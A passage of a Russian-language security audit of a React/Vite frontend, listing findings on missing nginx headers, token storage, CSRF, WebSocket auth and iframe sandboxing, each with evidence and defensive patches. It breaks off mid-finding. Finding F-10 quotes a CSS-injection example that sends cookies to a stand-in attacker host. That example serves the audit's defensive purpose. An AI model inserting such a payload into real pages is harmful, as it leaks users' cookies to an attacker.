# Security Audit — `bedolaga-cabinet`

Дата: 2026‑05‑04
Аудитор: Senior Application Security Engineer (frontend)
Объём: фронтенд `bedolaga-cabinet` (React 19 + Vite 7 + TypeScript + Zustand + React Query + Telegram WebApp SDK), Dockerfile, nginx.conf, vite.config.ts, переменные окружения. Бэкенд не аудировался — только клиентские гипотезы.

---

## Executive Summary

Кодовая база демонстрирует разумную базовую гигиену: refresh‑токен изолирован от access‑токена (sessionStorage / localStorage), пользовательский HTML обрабатывается DOMPurify со строгими allowlist‑ами, ввод OAuth‑state хранится в `sessionStorage`, redirect‑параметры в `TelegramRedirect` и `DeepLinkRedirect` валидируются по allowlist схем. Однако есть **серьёзные пробелы в инфраструктурном слое**: `nginx.conf` не отдаёт ни одного security‑заголовка (CSP/HSTS/XFO/Referrer-Policy/Permissions-Policy/X-Content-Type-Options) и содержит **неработающий блок `/api/`** без `proxy_pass`. На клиенте присутствует **«CSRF‑театр»** — токен генерируется в браузере, кладётся в cookie и в одноимённый заголовок без серверной валидации (а аутентификация и так Bearer‑заголовок). Refresh‑токен хранится в `localStorage` — XSS даст злоумышленнику долгоживущий доступ к аккаунту. Access‑токен передаётся в WebSocket через query‑параметр (попадает в логи прокси). Имеется дрейф между `package-lock.json` и `pnpm-lock.yaml`, отсутствуют `eslint-plugin-security` / secret‑scanning в pre‑commit, в `.env` лежит реальный production URL (трекером не отслеживается, но риск разглашения через бэкап рабочего каталога). Большинство XSS‑точек закрыто, но у `Info.tsx`/`InfoPageView.tsx` атрибут `style` всё же разрешён (фильтр оставляет только `text-align`) и iframe’ы получают `sandbox="allow-scripts allow-same-origin"` — допустимо для cross‑origin (YouTube/Vimeo), но при изменении allowlist‑а легко превратится в дыру.

В сумме: **0 Critical, 5 High, 11 Medium, 6 Low, 4 Info** находок. Приоритет №1 — закрыть инфраструктурные пробелы (nginx headers, refresh‑token storage, WebSocket auth, удалить мёртвый CSRF‑код или сделать его настоящим).

---

## Сводная таблица находок

| ID | Область | Severity | Файл / строки | Описание |
|----|---------|---------|---------------|----------|
| F-01 | nginx / заголовки | 🟠 High | `nginx.conf` | Полностью отсутствуют CSP, HSTS, X-Frame-Options/frame-ancestors, X-Content-Type-Options, Referrer-Policy, Permissions-Policy. |
| F-02 | nginx / proxy | 🟠 High | `nginx.conf:14-21` | Блок `/api/` без `proxy_pass` — запросы фолбэчатся на `index.html`. Конфиг неработоспособен (или вводит в заблуждение). |
| F-03 | Auth / хранилище токенов | 🟠 High | `src/utils/token.ts:62-67`, `:54-59` | Refresh‑токен в `localStorage` доступен любому JS на странице → XSS = угон аккаунта (refresh токен обычно долгоживущий). |
| F-04 | CSRF | 🟠 High | `src/api/client.ts:15-38, 124-127` | Самовыпускаемый CSRF‑токен (cookie+header с одинаковым значением, без серверной валидации) даёт ложное чувство защиты, ломает dev (`Secure` на http://) и не нужен при Bearer‑аутентификации. |
| F-05 | Auth / WebSocket | 🟠 High | `src/providers/WebSocketProvider.tsx:11-34, 76-79` | Access‑токен передаётся как `?token=...` в WS URL → попадает в access‑логи nginx, прокси, истории браузера, Sentry breadcrumbs. |
| F-06 | nginx / кеш | 🟡 Medium | `nginx.conf:24-28` | Все статические файлы (включая ассеты с хеш‑именами **и** SVG/иконки) уходят с `expires 1y; Cache-Control: public`, но `index.html` не помечен как `no-store` → клиенты могут показывать устаревший шелл, ссылающийся на удалённые чанки. |
| F-07 | Auth / автоматический логин | 🟡 Medium | `src/pages/AutoLogin.tsx:14-26, 28-46` | Single‑use токен в URL остаётся в адресной строке (не вычищается через `history.replaceState`) → попадает в историю браузера, расширения, аналитику. |
| F-08 | Auth / Telegram initData | 🟡 Medium | `src/utils/token.ts:113-117`, `src/api/client.ts:40-52` | `initData` хранится в `sessionStorage` и пере-отправляется на каждый Telegram-эндпоинт. Сервер обязан проверять freshness (`auth_date`), иначе возможен replay. Также любой XSS в момент сессии получает валидный signed initData. |
| F-09 | XSS / iframe sandbox | 🟡 Medium | `src/pages/Info.tsx:120-135`, `src/pages/InfoPageView.tsx:119-129` | `sandbox="allow-scripts allow-same-origin allow-presentation"` для iframe. Сейчас допустимо потому что allowlist хостов = YouTube/Vimeo (cross‑origin), но при добавлении в allowlist same‑origin хоста sandbox будет полностью обойдён. |
| F-10 | XSS / стили | 🟡 Medium | `src/pages/Info.tsx:155-163`, `src/pages/InfoPageView.tsx:156-166` | Атрибут `style` в allowlist DOMPurify. Хотя `afterSanitizeAttributes` фильтрует всё кроме `text-align`, любая правка allowlist может вернуть полный `style=` и открыть CSS‑injection / data‑exfil. Лучше убрать `style` из ALLOWED_ATTR. |
| F-11 | Логирование / PII | 🟡 Medium | `src/pages/AdminUserDetail.tsx:395-540`, `src/pages/AdminUsers.tsx:210-221`, `src/pages/SavedCards.tsx:63`, `src/pages/TelegramRedirect.tsx:100`, `src/components/ErrorBoundary.tsx:37` | Голые `console.error(...)` без guard `import.meta.env.DEV`. В прод‑бандле они логируют объекты ошибок, иногда с телом ответа. |
| F-12 | Reverse tabnabbing | 🟡 Medium | `src/platform/adapters/WebAdapter.ts:199`, `src/platform/adapters/TelegramAdapter.ts:284,293,301`, `src/pages/Wheel.tsx:326,371` | `window.open(url, '_blank')` без `noopener,noreferrer`. URL приходит с сервера, но при компрометации эндпоинта получаем reverse-tabnabbing. |
| F-13 | Supply chain / lockfiles | 🟡 Medium | `package.json`, `package-lock.json`, `pnpm-lock.yaml`, `Dockerfile:10` | В репо одновременно npm и pnpm локфайлы, а Docker строит через `npm ci`. Дрейф = разные деревья зависимостей в dev и prod, выше шанс уязвимостей и нерепродьюсимых сборок. |
| F-14 | ESLint / static analysis | 🟡 Medium | `eslint.config.js`, `.husky/pre-commit` | Нет `eslint-plugin-security`, нет secret‑scanning (`gitleaks`/`trufflehog`) в pre‑commit; husky запускает только `lint-staged`. |
| F-15 | Vite / dev сервер | 🟡 Medium | `vite.config.ts:20-31` | `server.host: true` → bind на `0.0.0.0`. Прокси `/api → http://localhost:8080` без `secure` опций. Только dev, но стоит явно ограничить или задокументировать. |
| F-16 | Email‑preview iframe | 🟡 Medium | `src/pages/AdminEmailTemplatePreview.tsx:55-65, 106-111` | `doc.write(previewHtml)` в iframe с `sandbox="allow-same-origin"`. Без `allow-scripts` JS не выполнится, но `same-origin` даёт iframe доступ к родительскому DOM (через `frameElement`/`window.parent`) — лучше убрать обе опции и оставить пустой sandbox. |
| F-17 | OAuth callback URL | 🔵 Low | `src/pages/OAuthCallback.tsx:75-77` | `replaceState` чистит `code/state`, но **после** инициирования сетевого запроса. Окно между навигацией и replaceState достаточно, чтобы значение попало в Sentry/breadcrumbs/расширения. Чистить URL до асинхронных операций. |
| F-18 | Внешние ресурсы / SRI | 🔵 Low | `index.html:16-29, 30-43` | Подгружаются Google Fonts CSS и `https://telegram.org/js/telegram-web-app.js` без `integrity=`. Без CSP это эффективно полное доверие двум CDN. |
| F-19 | Inline скрипт | 🔵 Low | `index.html:30-43` | Inline `<script>` в `index.html` для определения Telegram. CSP с `script-src 'self'` сломает; либо удалить inline, либо добавить nonce. |
| F-20 | Dockerfile / runtime user | 🔵 Low | `Dockerfile:31-43` | `nginx:alpine` запускается под root по умолчанию. Defense‑in‑depth: добавить `USER nginx`. |
| F-21 | ErrorBoundary | 🔵 Low | `src/components/ErrorBoundary.tsx:37` | Безусловный `console.error` в проде раскрывает component stack. |
| F-22 | `.env` в рабочем каталоге | 🔵 Low | `.env`, `.gitignore`, `.dockerignore` | `.env` не закоммичен (✓), но в working tree лежит реальный production URL. Risk = бэкапы / утечки на shared dev‑машинах. Документировать процесс. |
| F-23 | Permissions client‑only | ⚪ Info | `src/store/permissions.ts`, `src/components/auth/PermissionRoute.tsx` | Все RBAC‑проверки клиентские. UI можно подделать. Нужна обязательная серверная проверка по каждому admin‑эндпоинту. (Стандартный риск SPA, но фиксируем.) |
| F-24 | Slim email/password validation | ⚪ Info | `src/utils/validation.ts:1-5`, `src/pages/CabinetLogin.tsx:240-243` | Email — `/^[^\s@]+@[^\s@]+\.[^\s@]+$/`, пароль — `length >= 8`. Достаточно для UX, но сервер обязан валидировать. |
| F-25 | Lazy chunk reload | ⚪ Info | `src/App.tsx:9-22` | `lazyWithRetry` вызывает `window.location.reload()`. 30‑сек guard защищает от петли, но не от сценария «новый деплой ломает старый бандл». |
| F-26 | Lottiefiles vendor чанк | ⚪ Info | `vite.config.ts:57` | `vendor-lottie` упомянут, но в `package.json` `@lottiefiles/*` не вижу — мёртвая ветка manualChunks. Не влияет на безопасность, чисто технический долг. |

---

## Детальные карточки

### 🟠 F-01. Отсутствуют security‑заголовки в nginx

**Описание.** `nginx.conf` отдаёт ассеты SPA, но не добавляет ни одного security‑заголовка.

**Доказательство.** `@/Users/Nichi/progr/verno/bedolaga-cabinet/nginx.conf:1-29`

```nginx
server {
    listen 80;
    server_name _;
    root /usr/share/nginx/html;
    index index.html;
    location / { try_files $uri /index.html; }
    location /api/ { try_files $uri /index.html;  proxy_set_header ... }
    location ~* \.(?:ico|css|js|...)$ { expires 1y; access_log off; add_header Cache-Control "public"; }
}
```

Нет `Content-Security-Policy`, `Strict-Transport-Security`, `X-Frame-Options`/`frame-ancestors`, `X-Content-Type-Options`, `Referrer-Policy`, `Permissions-Policy`.

**Impact.**
- XSS не ограничен CSP → любая инъекция выкачивает токены/PII на произвольный домен.
- Clickjacking возможен (нет `frame-ancestors`/`X-Frame-Options`); особенно критично для админки и страниц оплаты.
- MIME‑sniffing атаки (нет `nosniff`).
- Без HSTS возможны downgrade‑атаки.

**OWASP / CWE.** OWASP A05:2021 Security Misconfiguration; CWE‑693 Protection Mechanism Failure; CWE‑1021 Improper Restriction of Rendered UI Layers.

**Patch (минимальный).**

```diff
--- a/nginx.conf
+++ b/nginx.conf
@@
 server {
     listen 80;
     server_name _;
@@
     root /usr/share/nginx/html;
     index index.html;
+
+    # --- Security headers ---
+    add_header X-Content-Type-Options "nosniff" always;
+    add_header X-Frame-Options "DENY" always;
+    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
+    add_header Permissions-Policy "geolocation=(), microphone=(), camera=(), payment=(self)" always;
+    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
+    # CSP — подобрать под реальный backend; ниже стартовый скелет.
+    # connect-src должен содержать API origin + ws/wss origin.
+    add_header Content-Security-Policy "default-src 'self'; script-src 'self' https://telegram.org; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: blob: https:; frame-src https://www.youtube.com https://www.youtube-nocookie.com https://player.vimeo.com; connect-src 'self' wss: https:; frame-ancestors 'none'; base-uri 'self'; form-action 'self'; object-src 'none'" always;
 
     location / {
         try_files $uri /index.html;
+        add_header Cache-Control "no-store" always;
     }
@@
     location ~* \.(?:ico|css|js|gif|jpe?g|png|woff2?|eot|ttf|svg)$ {
         expires 1y;
         access_log off;
-        add_header Cache-Control "public";
+        add_header Cache-Control "public, immutable";
     }
 }
```

> CSP придётся подкручивать (для Yandex Metrika/Google Ads, OAuth провайдеров, локального API origin). Если оставлять inline‑скрипт в `index.html`, CSP сломает страницу — см. F-19.

---

### 🟠 F-02. `/api/` location без `proxy_pass`

**Доказательство.** `@/Users/Nichi/progr/verno/bedolaga-cabinet/nginx.conf:13-21`

```nginx
location /api/ {
    try_files $uri /index.html;
    proxy_http_version 1.1;
    proxy_set_header Host $host;
    proxy_set_header X-Real-IP $remote_addr;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header X-Forwarded-Proto $scheme;
}
```

`proxy_set_header` без `proxy_pass` — мёртвый код. Запрос `GET /api/foo` уйдёт через `try_files` в `index.html` и вернёт SPA‑HTML на запрос JSON API. В реальном деплое скорее всего фронт стоит за внешним прокси (`docker-compose.yml` сам по себе ничего не проксирует), и блок `/api/` никем не используется — но код в репо вводит в заблуждение и при попытке использовать «как есть» сломается.

**Impact.** Configuration‑level confusion. При попытке self‑hosted proxy запросы к API возвращают HTML, что может маскировать ошибки в инцидентах и приводить к парсинг‑ошибкам в клиенте.

**Recommendation.** Удалить блок целиком (если `VITE_API_URL=https://...api.example`) либо добавить `proxy_pass http://backend:8080;`:

```diff
-    location /api/ {
-        try_files $uri /index.html;
-        proxy_http_version 1.1;
-        proxy_set_header Host $host;
-        proxy_set_header X-Real-IP $remote_addr;
-        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
-        proxy_set_header X-Forwarded-Proto $scheme;
-    }
+    # Раскомментировать если фронт + бэк в одном контейнере/сети
+    # location /api/ {
+    #     proxy_pass http://backend:8080/cabinet/;
+    #     proxy_http_version 1.1;
+    #     proxy_set_header Host $host;
+    #     proxy_set_header X-Real-IP $remote_addr;
+    #     proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+    #     proxy_set_header X-Forwarded-Proto $scheme;
+    # }
```

---

### 🟠 F-03. Refresh‑токен в `localStorage`

**Доказательство.** `@/Users/Nichi/progr/verno/bedolaga-cabinet/src/utils/token.ts:62-66`

```ts
setTokens(accessToken: string, refreshToken: string): void {
  try {
    sessionStorage.setItem(TOKEN_KEYS.ACCESS, accessToken);
    localStorage.setItem(TOKEN_KEYS.REFRESH, refreshToken);
    sessionStorage.removeItem(TOKEN_KEYS.REFRESH);
  } catch {}
},
```

Access‑токен в sessionStorage — это уже шаг лучше, чем localStorage. Но refresh‑токен лежит в **localStorage**, его TTL обычно недели/месяцы. Любой XSS (включая будущий — см. F-09/F-10) может выкачать его и получить долгоживущий persistent доступ.

**Impact.** XSS → полный угон аккаунта, несмотря на короткий TTL access‑токена. CWE‑522 Insufficiently Protected Credentials; OWASP A02:2021 Cryptographic Failures.

**Recommendation.** Перенести refresh‑токен в `HttpOnly; Secure; SameSite=Lax` cookie, выпускаемую сервером. Эндпоинт `/cabinet/auth/refresh` тогда читает токен из cookie, фронт его никогда не видит. Альтернатива на коротком горизонте: SubtleCrypto‑шифрование refresh‑токена ключом из IndexedDB (не блокирует XSS, но усложняет автоматизацию). До миграции: явно ограничить TTL refresh‑токена и rotation per‑use.

```diff
- setTokens(accessToken: string, refreshToken: string): void {
+ setTokens(accessToken: string, refreshToken?: string): void {
   try {
     sessionStorage.setItem(TOKEN_KEYS.ACCESS, accessToken);
-    localStorage.setItem(TOKEN_KEYS.REFRESH, refreshToken);
-    sessionStorage.removeItem(TOKEN_KEYS.REFRESH);
+    // refresh‑токен не хранится на клиенте — он живёт в HttpOnly‑cookie,
+    // выставленной сервером. Параметр оставлен для обратной совместимости.
   } catch {}
 },
```

> Это требует синхронных правок на бэке: `Set-Cookie` на login/refresh, `withCredentials: true` в axios, корректный CORS (`Access-Control-Allow-Credentials: true` + `Access-Control-Allow-Origin` без `*`).

---

### 🟠 F-04. CSRF‑токен — самовыпускаемый, без серверной валидации

**Доказательство.** `@/Users/Nichi/progr/verno/bedolaga-cabinet/src/api/client.ts:15-38, 124-127`

```ts
const CSRF_COOKIE_NAME = 'csrf_token';
const CSRF_HEADER_NAME = 'X-CSRF-Token';
function generateCsrfToken(): string {
  const array = new Uint8Array(32);
  crypto.getRandomValues(array);
  return Array.from(array, (byte) => byte.toString(16).padStart(2, '0')).join('');
}
function ensureCsrfToken(): string {
  let token = getCsrfToken();
  if (!token) {
    token = generateCsrfToken();
    document.cookie = `${CSRF_COOKIE_NAME}=${token}; path=/; SameSite=Strict; Secure`;
  }
  return token;
}
// ...
if (method && ['POST', 'PUT', 'DELETE', 'PATCH'].includes(method) && config.headers) {
  config.headers[CSRF_HEADER_NAME] = ensureCsrfToken();
}
```

Проблемы:

1. Токен **генерирует и подписывает сам клиент**, кладёт одно и то же значение в cookie и заголовок. Сервер физически не может отличить настоящий запрос от подделки, если он не выпускал токен сам.
2. Cookie ставится с `Secure` — на dev (`http://localhost:5173`) браузер её отбросит, и каждый запрос будет генерировать новый токен.
3. Аутентификация — Bearer в заголовке `Authorization`, **CSRF архитектурно не нужен** (cookie‑based auth не используется). Текущая реализация — security theatre, маскирующее реальный отсутствующий контроль и сбивающее код‑ревью.

**Impact.** Ложное чувство защиты; ломает dev; добавляет сетевой шум. CWE‑352 (если бы реально нужно было — текущая реализация не защищает); OWASP A04:2021.

**Recommendation.** Выбрать одно из двух:

- **Если CSRF не нужен** (Bearer‑аутентификация): удалить весь блок CSRF‑кода:

  ```diff
  -const CSRF_COOKIE_NAME = 'csrf_token';
  -const CSRF_HEADER_NAME = 'X-CSRF-Token';
  -function getCsrfToken(): string | null { ... }
  -function generateCsrfToken(): string { ... }
  -function ensureCsrfToken(): string { ... }
  ...
  -  const method = config.method?.toUpperCase();
  -  if (method && ['POST', 'PUT', 'DELETE', 'PATCH'].includes(method) && config.headers) {
  -    config.headers[CSRF_HEADER_NAME] = ensureCsrfToken();
  -  }
  ```

- **Если планируется cookie‑based auth** (см. F-03): сервер должен выпускать `csrf_token` cookie сам (HttpOnly **не** ставится, чтобы JS мог прочесть для double‑submit), фронт читает её и копирует в заголовок. Cookie без `Secure` для dev (или две cookie через env).

---

### 🟠 F-05. Access‑токен в URL WebSocket‑соединения

**Доказательство.** `@/Users/Nichi/progr/verno/bedolaga-cabinet/src/providers/WebSocketProvider.tsx:11-34, 76-79`

```ts
const withToken = (base: string) => `${base}?token=${encodeURIComponent(accessToken)}`;
// ...
const wsUrl = buildWebSocketUrl(accessToken);
const ws = new WebSocket(wsUrl);
```

URL c токеном попадает в access‑логи nginx (`$request_uri`), CDN‑логи, Sentry breadcrumbs (если когда‑то будет подключён), `Referer` родительских страниц при отладке через DevTools, в IDB IndexedDB логирующих расширений.

**Impact.** Утечка короткоживущего access‑токена в логи третьих сторон. CWE‑598 (Use of GET Request Method With Sensitive Query Strings).

**Recommendation.** Использовать `Sec-WebSocket-Protocol` для passthrough токена (нестандартно, но широко применяется), либо отдавать одноразовый WS‑ticket через POST `/cabinet/ws/ticket` и подключаться `?ticket=...` (короткий TTL, единичное использование), либо аутентифицироваться первым сообщением после `open`.

```diff
- const withToken = (base: string) => `${base}?token=${encodeURIComponent(accessToken)}`;
+ // Аутентификация уходит первым сообщением; URL чистый.
+ const buildWsUrl = (base: string) => base;
...
- const wsUrl = buildWebSocketUrl(accessToken);
+ const wsUrl = buildWebSocketUrl();
  const ws = new WebSocket(wsUrl);
+ ws.addEventListener('open', () => {
+   ws.send(JSON.stringify({ type: 'auth', token: accessToken }));
+ });
```

---

### 🟡 F-06. `Cache-Control: no-store` для `index.html` отсутствует

**Доказательство.** `@/Users/Nichi/progr/verno/bedolaga-cabinet/nginx.conf:9-11, 24-28`

`index.html` попадает в `location /`, кэш‑заголовки не выставлены. Хешированные ассеты (`/assets/index-*.js`) уходят с `expires 1y; Cache-Control: public` — но без `immutable` и без отдельной обработки `index.html`.

**Impact.** Старый закешированный `index.html` ссылается на удалённые после нового деплоя чанки → пользователь ловит белый экран. Плюс, нет `immutable` для хешированных файлов = лишние revalidation‑запросы. CWE‑524.

**Recommendation.** См. patch в F-01 (добавлен `no-store` в `location /` и `immutable` для статики).

---

### 🟡 F-07. Token остаётся в URL после AutoLogin

**Доказательство.** `@/Users/Nichi/progr/verno/bedolaga-cabinet/src/pages/AutoLogin.tsx:15-46`

```ts
const token = searchParams.get('token');
useEffect(() => {
  // Prevent referrer leaking the token
  const meta = document.createElement('meta');
  meta.name = 'referrer';
  meta.content = 'no-referrer';
  document.head.appendChild(meta);
  ...
}, []);

useEffect(() => {
  if (!token || attemptedRef.current) { ... }
  attemptedRef.current = true;
  authApi.autoLogin(token).then(...).catch(...);
}, [token, ...]);
```

`<meta name="referrer">` блокирует только Referer, но `?token=...` остаётся в `window.location` и попадает в:
- историю браузера,
- session‑restore,
- Sentry/аналитику (`window.location.href`),
- расширения, читающие активный URL.

**Impact.** Если token однократный — частично смягчает; если многоразовый/долгоживущий — серьёзная утечка. CWE‑598.

**Recommendation.**

```diff
   useEffect(() => {
     if (!token || attemptedRef.current) {
       if (!token) setError(true);
       return;
     }
     attemptedRef.current = true;
+    // Сразу убираем токен из URL, до сетевого запроса
+    window.history.replaceState({}, '', window.location.pathname);
 
     authApi
       .autoLogin(token)
```

---

### 🟡 F-08. Telegram `initData` сохраняется в `sessionStorage`

**Доказательство.**

`@/Users/Nichi/progr/verno/bedolaga-cabinet/src/utils/token.ts:113-117`
```ts
setTelegramInitData(data: string): void {
  try { sessionStorage.setItem(TOKEN_KEYS.TELEGRAM_INIT, data); } catch {}
},
```

`@/Users/Nichi/progr/verno/bedolaga-cabinet/src/api/client.ts:40-52, 117-122`
```ts
const getTelegramInitData = (): string | null => {
  ...
  try {
    const raw = retrieveRawInitData();
    if (raw) { tokenStorage.setTelegramInitData(raw); return raw; }
  } catch {}
  return tokenStorage.getTelegramInitData();
};
...
if (isTelegramAuthEndpoint) {
  const telegramInitData = getTelegramInitData();
  if (telegramInitData && config.headers) {
    config.headers['X-Telegram-Init-Data'] = telegramInitData;
  }
}
```

**Impact.** При XSS любой код может прочесть `initData` (с валидным `hash`) и переслать его. На сервере Telegram WebApp авторизация валидируется по `hash` + `auth_date`. Если бэкенд **не** проверяет `auth_date` строго (≤ 60 секунд) — replay возможен. Также init данные содержат user.id/username/photo (PII).

**Recommendation.** Не кешировать `initData` дольше необходимого: получить → сразу отправить → не сохранять. Если кеш нужен (offline отрисовка имени), хранить только публичные поля, а сам подписанный raw — каждый раз получать через `retrieveRawInitData()`.

```diff
 const getTelegramInitData = (): string | null => {
   if (typeof window === 'undefined') return null;
   try {
     const raw = retrieveRawInitData();
-    if (raw) {
-      tokenStorage.setTelegramInitData(raw);
-      return raw;
-    }
+    if (raw) return raw;
   } catch {}
-  return tokenStorage.getTelegramInitData();
+  return null;
 };
```

> Требует проверки: серверная сторона должна валидировать `auth_date` строго (recommended ≤ 60 сек). Документировать это явно. **Требует проверки на сервере.**

---

### 🟡 F-09. Слабый sandbox у iframe c пользовательским контентом

**Доказательство.** `@/Users/Nichi/progr/verno/bedolaga-cabinet/src/pages/InfoPageView.tsx:119-129`

```ts
infoPagePurify.addHook('afterSanitizeAttributes', (node) => {
  if (node.tagName === 'IFRAME') {
    const src = node.getAttribute('src') ?? '';
    if (!isAllowedIframeSrc(src)) { node.remove(); return; }
    node.setAttribute('sandbox', 'allow-scripts allow-same-origin allow-presentation');
    node.setAttribute('allow', 'autoplay; encrypted-media; picture-in-picture');
  }
});
```

И аналог в `Info.tsx:120-135`. Хосты ограничены YouTube/Vimeo, и поскольку они **не** same‑origin приложения, флаг `allow-same-origin` для iframe указывает «оставить родной origin iframe». Сейчас это безопасно. **Но** комбинация `allow-scripts allow-same-origin` для same‑origin iframe (если кто‑то добавит свой домен в `ALLOWED_IFRAME_HOSTS`) **полностью отключает sandbox** — iframe сможет переписать `parent.location`, читать DOM, угнать токены.

**Impact.** Высокая хрупкость: одна правка allowlist превращает функцию в чёрный ход. CWE‑1021.

**Recommendation.** Жестко оставить `allow-scripts` и **не** ставить `allow-same-origin` — для cross‑origin embed YouTube/Vimeo это работает корректно (видео не требует доступа к parent):

```diff
-    node.setAttribute('sandbox', 'allow-scripts allow-same-origin allow-presentation');
+    node.setAttribute('sandbox', 'allow-scripts allow-presentation');
```

Дополнительно — комментарий о том, **почему** `allow-same-origin` запрещён.

---

### 🟡 F-10. Атрибут `style` в allowlist DOMPurify

**Доказательство.** `@/Users/Nichi/progr/verno/bedolaga-cabinet/src/pages/InfoPageView.tsx:87-110, 156-166`, `Info.tsx:210-234`

```ts
ALLOWED_ATTR: [
  'href','target','rel','src','alt','title','width','height',
  'loading','class','start','reversed','type','controls','preload',
  'frameborder','allowfullscreen','allow','sandbox','style',
],
...
// после санитизации удаляем всё кроме text-align
infoPagePurify.addHook('afterSanitizeAttributes', (node) => {
  if (node.hasAttribute('style')) {
    const style = node.getAttribute('style') ?? '';
    const match = style.match(/text-align\s*:\s*(left|center|right|justify)/i);
    if (match) node.setAttribute('style', `text-align: ${match[1]}`);
    else node.removeAttribute('style');
  }
});
```

Подход «разрешим всё, потом отфильтруем» — антипаттерн: любая рефакторинг‑ошибка / удаление хука вернёт полный CSS injection (`background: url(//evil.com?cookie=...)`, `expression(...)` в IE‑совместимых движках, exfiltration через CSS selectors).

**Impact.** Будущий регресс легко превращается в XSS/CSS‑injection. CWE‑79.

**Recommendation.** Убрать `style` из ALLOWED_ATTR; для `text-align` использовать классы (`text-left`, `text-center`, ...), которые TipTap уже умеет.

```diff
   ALLOWED_ATTR: [
     'href','target','rel','src','alt','title','width','height',
     'loading','class','start','reversed','type','controls','preload',
-    'frameborder','allowfullscreen','allow','sandbox','style',
+    'frameborder','allowfullscreen','allow','sandbox',
   ],
   ALLOW_DATA_ATTR: false,
   ADD_ATTR: ['target'],
 };
```

И удалить соответствующие `afterSanitizeAttributes` для `style`. Если требуется именно inline‑стиль (для legacy контента) — оставить только маппинг `text-align` через CSS‑класс.

---

### 🟡 F-11. `console.error` без guard в проде

**Доказательство.** Найдены безусловные вызовы:

- `@/Users/Nichi/progr/verno/bedolaga-cabinet/src/components/ErrorBoundary.tsx:37`
- `@/Users/Nichi/progr/verno/bedolaga-cabinet/src/pages/AdminUsers.tsx:210, 221`
- `@/Users/Nichi/progr/verno/bedolaga-cabinet/src/pages/AdminUserDetail.tsx:395, 408, 418, 430, 442, 540`
- `@/Users/Nichi/progr/verno/bedolaga-cabinet/src/pages/SavedCards.tsx:63`
- `@/Users/Nichi/progr/verno/bedolaga-cabinet/src/pages/TelegramRedirect.tsx:100`

При этом существует `src/utils/logger.ts`, который специально гасит логи в проде. Он не везде применяется.

**Impact.** Раскрытие server‑side error payloads (часто содержат email пользователей, внутренние коды) и component stack‑trace в DevTools — помогает злоумышленнику разведывать API.

**Recommendation.** Везде использовать `logger.error(...)` из `src/utils/logger.ts`, или хотя бы `if (import.meta.env.DEV) console.error(...)`.

---

### 🟡 F-12. `window.open` без `noopener,noreferrer`

**Доказательство.** `@/Users/Nichi/progr/verno/bedolaga-cabinet/src/platform/adapters/WebAdapter.ts:199`

```ts
window.open(_url, '_blank');
```

Аналогично `TelegramAdapter.ts:284, 293, 301` (fallback ветви), `Wheel.tsx:371` (`about:blank`, потом `location.href = data.invoice_url`).

**Impact.** Reverse tabnabbing: открытое окно через `window.opener` может перенаправить родительскую вкладку на фишинговую копию. CWE‑1022.

**Recommendation.**

```diff
-  window.open(_url, '_blank');
+  window.open(_url, '_blank', 'noopener,noreferrer');
```

То же самое для всех остальных `window.open(url, '_blank')` без третьего аргумента.

В `Wheel.tsx` пред‑открытие `about:blank` нужно для обхода popup‑блокатора, но затем `preOpenedWindowRef.current.location.href = ...`. Лучше сразу указывать `noopener` при открытии — после этого `preOpenedWindowRef.current` будет `null`, и нужно перейти на `window.location.assign` после получения `invoice_url` или принять fallback.

---

### 🟡 F-13. Дрейф `package-lock.json` ↔ `pnpm-lock.yaml`

**Доказательство.** В корне присутствуют:
- `package-lock.json` (293776 байт)
- `pnpm-lock.yaml` (205219 байт)

`Dockerfile:10` использует `npm ci` если есть `package-lock.json`. README может рекомендовать `pnpm`. В CI (если он есть) скорее всего другой инструмент.

**Impact.** Невоспроизводимые сборки → разные транзитивные зависимости в CI и в Docker. Отсутствие единой точки правды для аудита уязвимостей. Supply‑chain риски.

**Recommendation.** Удалить один из локфайлов и зафиксировать `packageManager` в `package.json`:

```diff
@@ "type": "module",
+  "packageManager": "pnpm@9.0.0",
   "scripts": {
```

И `Dockerfile`:

```diff
- COPY package.json package-lock.json* ./
- RUN if [ -f package-lock.json ]; then npm ci; else npm install; fi
+ COPY package.json pnpm-lock.yaml ./
+ RUN corepack enable && pnpm install --frozen-lockfile
```

И добавить в `.gitignore` второй локфайл, чтобы не возвращался.

---

### 🟡 F-14. Нет security‑линтеров и secret‑scanning в pre‑commit

**Доказательство.** `@/Users/Nichi/progr/verno/bedolaga-cabinet/.husky/pre-commit` — `npx lint-staged`. `@/Users/Nichi/progr/verno/bedolaga-cabinet/eslint.config.js` подключает только `eslint-plugin-react-hooks`, `eslint-plugin-react-refresh`. Нет `eslint-plugin-security`, нет `eslint-plugin-react/jsx-no-script-url`, нет gitleaks/trufflehog.

**Recommendation.** Добавить:

```diff
@@ devDependencies
+    "eslint-plugin-security": "^3.0.1",
+    "eslint-plugin-no-unsanitized": "^4.0.2",
```

`.husky/pre-commit`:
```diff
- npx lint-staged
+ npx lint-staged
+ npx --yes gitleaks protect --staged --no-banner -v
```

---

### 🟡 F-15. Vite dev server слушает на `0.0.0.0`

**Доказательство.** `@/Users/Nichi/progr/verno/bedolaga-cabinet/vite.config.ts:20-31`

```ts
server: {
  port: 5173,
  host: true,                 // → bind 0.0.0.0
  proxy: {
    '/api': {
      target: 'http://localhost:8080',
      changeOrigin: true,
      rewrite: (path) => path.replace(/^\/api/, ''),
    },
  },
},
```

В рамках разработки часто полезно (тест на телефоне в той же сети), но в CI/публичной Wi‑Fi сети это раскрывает dev‑сервер с `Bearer`‑токенами в коллегах. Также `target: http://localhost:8080` без `secure: false`/timeout/restrict.

**Recommendation.**

```diff
   server: {
     port: 5173,
-    host: true,
+    host: process.env.VITE_DEV_HOST === 'true', // явный opt‑in
     proxy: {
       '/api': {
         target: 'http://localhost:8080',
         changeOrigin: true,
         rewrite: (path) => path.replace(/^\/api/, ''),
       },
     },
   },
```

---

### 🟡 F-16. `AdminEmailTemplatePreview` iframe sandbox `allow-same-origin`

**Доказательство.** `@/Users/Nichi/progr/verno/bedolaga-cabinet/src/pages/AdminEmailTemplatePreview.tsx:55-65, 106-111`

```tsx
useEffect(() => {
  if (previewHtml && iframeRef.current) {
    const doc = iframeRef.current.contentDocument;
    if (doc) { doc.open(); doc.write(previewHtml); doc.close(); }
  }
}, [previewHtml]);
...
